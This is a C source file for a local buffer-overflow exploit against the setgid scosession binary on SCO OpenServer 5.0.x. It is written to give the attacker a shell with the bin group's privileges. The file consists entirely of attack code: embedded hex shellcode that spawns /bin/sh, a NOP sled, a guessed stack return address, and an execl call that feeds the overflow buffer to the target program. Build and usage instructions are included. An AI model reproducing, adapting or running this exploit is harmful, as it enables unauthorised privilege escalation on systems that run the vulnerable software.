
/* SCO 5.0.x
 * scosession local bin exploit (sgid bin)
 * Will set egid=2(bin)
 *
 * gcc -o scosessionx scosessionx.c
 *
 * ./scosessionx <offset> <bufsiz>
 *
 * Brock Tellier btellier@webley.com
 */


#include <stdlib.h>
#include <stdio.h>

char scoshell[]= /* doble@iname.com */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";


#define LEN 10000
#define NOP 0x90

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


int main(int argc, char *argv[]) {

long int offset=0;

int i;
int buflen = LEN;
long int addr;
char buf[LEN];

if(argc > 3) {
 fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
 exit(0);
}
else if (argc == 3) {
 offset=atoi(argv[1]);
        buflen=atoi(argv[2]);
}
 else {
   offset=9000;
   buflen=2000;


 }


addr=get_sp();

fprintf(stderr, "scosession local exploit for SCO OpenServer 5.0.x\n");
fprintf(stderr, "By Brock Tellier btellier@webley.com\n\n");
fprintf(stderr, "Using addr: 0x%x\n", addr-offset);


memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),scoshell,strlen(scoshell));
for(i=((buflen/2) + strlen(scoshell))+4;i<buflen-4;i+=4)
 *(int *)&buf[i]=addr+offset;

execl("/usr/bin/X11/scosession", "scosession", "-bg", buf, NULL);

}
